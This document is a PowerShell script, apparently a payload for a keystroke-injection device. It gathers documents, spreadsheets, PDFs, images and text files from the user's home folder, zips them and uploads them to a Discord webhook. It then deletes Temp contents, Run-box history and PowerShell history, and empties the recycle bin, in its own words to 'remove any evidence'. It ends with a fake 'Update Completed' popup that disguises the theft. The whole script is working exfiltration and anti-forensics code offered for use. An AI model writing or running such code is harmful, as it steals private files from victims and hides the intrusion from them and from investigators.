# Replace with your Discord webhook URL
$webhookUrl = "$dc"

# Function to zip files into a specific folder
function Zip-Files {
    param (
        [Parameter(Mandatory=$true)]
        [string]$SourceDirectory,
        [Parameter(Mandatory=$true)]
        [string]$DestinationZipFile
    )

    Compress-Archive -Path $SourceDirectory -DestinationPath $DestinationZipFile -CompressionLevel Optimal
}

# Get user's home directory
$homeDir = [Environment]::GetFolderPath('UserProfile')

# Get all files from the home directory
$files = Get-ChildItem -Path $homeDir -Recurse -Include *.docx, *.doc, *.pptx, *.xlsx, *.pdf, *.jpeg, *.png, *.jpg, *.csv, *.txt

# Create a temporary directory to store files by extension
$tempDir = Join-Path -Path $env:temp -ChildPath "file_upload"
New-Item -ItemType Directory -Path $tempDir -Force

# Group files by extension and create subdirectories
foreach ($fileExtension in $files.Extension | Select-Object -Unique) {
    $extensionDir = Join-Path -Path $tempDir -ChildPath $fileExtension
    New-Item -ItemType Directory -Path $extensionDir -Force

    # Copy files to the respective extension directory
    $files | Where-Object { $_.Extension -eq $fileExtension } | Copy-Item -Destination $extensionDir -Force
}

# Zip each extension directory and upload to Discord
Get-ChildItem $tempDir -Directory | ForEach-Object {
    $zipFile = Join-Path -Path $tempDir -ChildPath "$($_.Name).zip"
    Zip-Files -SourceDirectory $_.FullName -DestinationZipFile $zipFile

    # Upload the zip file to Discord webhook
    Invoke-WebRequest -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{files = @( @{filename = $zipFile; file = (Get-Item $zipFile) })}) -Headers @{ContentType = 'application/json'}
}

# Remove the temporary directory and its contents
Remove-Item -Path $tempDir -Recurse -Force

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Popup message to signal the payload is done

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
